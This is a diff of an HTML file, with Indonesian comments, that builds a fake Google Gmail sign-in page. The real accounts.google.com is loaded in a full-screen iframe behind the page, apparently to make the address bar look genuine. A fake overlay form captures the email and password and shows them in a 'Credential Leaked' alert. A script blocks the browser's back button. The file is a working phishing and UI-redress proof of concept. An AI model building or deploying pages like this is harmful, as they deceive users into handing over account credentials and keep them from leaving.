@@ -1,20 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Google</title>
-</head>
-<body style="margin:0; padding:0; overflow:hidden;">
-    <!-- Iframe asli Google (tidak terlihat) -->
-    <iframe src="https://accounts.google.com" style="width:100vw; height:100vh; border:none; opacity:0; position:absolute; top:0; left:0; z-index:1;"></iframe>
-    
-    <!-- UI Palsu di atasnya -->
-    <div style="position:absolute; top:0; left:0; width:100vw; height:100vh; background:#fff; z-index:2; display:flex; justify-content:center; align-items:center; flex-direction:column;">
-        <h2>Sign in</h2>
-        <p style="color:#5f6368;">to continue to Gmail</p>
-        <input type="text" placeholder="Email" style="padding:10px; margin-bottom:10px; width:250px;">
-        <input type="password" placeholder="Password" style="padding:10px; margin-bottom:10px; width:250px;">
-        <button style="padding:10px 20px; background:#1a73e8; color:#fff; border:none; border-radius:4px;">Next</button>
+<head><title>Loading...</title></head>
+<body style="margin:0; padding:0;">
+    <!-- 1. Iframe di belakang untuk memancing Address Bar -->
+    <iframe src="https://accounts.google.com" style="width:100vw; height:100vh; border:none; position:absolute; top:0; left:0; z-index:1;"></iframe>
+
+    <!-- 2. UI Palsu di atasnya (Bisa diklik) -->
+    <div style="position:absolute; top:0; left:0; width:100vw; height:100vh; background:#fff; z-index:2;">
+        <div style="text-align:center; padding-top:40px;">
+            <h2>Sign in</h2>
+            <p>to continue to Gmail</p>
+            <!-- Form Interaktif -->
+            <input type="text" id="email" placeholder="Email" style="padding:10px; margin-bottom:10px; width:80%;">
+            <input type="password" id="pass" placeholder="Password" style="padding:10px; margin-bottom:10px; width:80%;">
+            <button onclick="alert('Credential Leaked: ' + document.getElementById('email').value + ' & ' + document.getElementById('pass').value)" style="padding:10px 20px; background:#1a73e8; color:#fff; border:none;">Next</button>
+        </div>
     </div>
+
+    <script>
+        // 3. Kunci History agar tidak bisa di-back
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.go(1); };
+    </script>
 </body>
 </html>
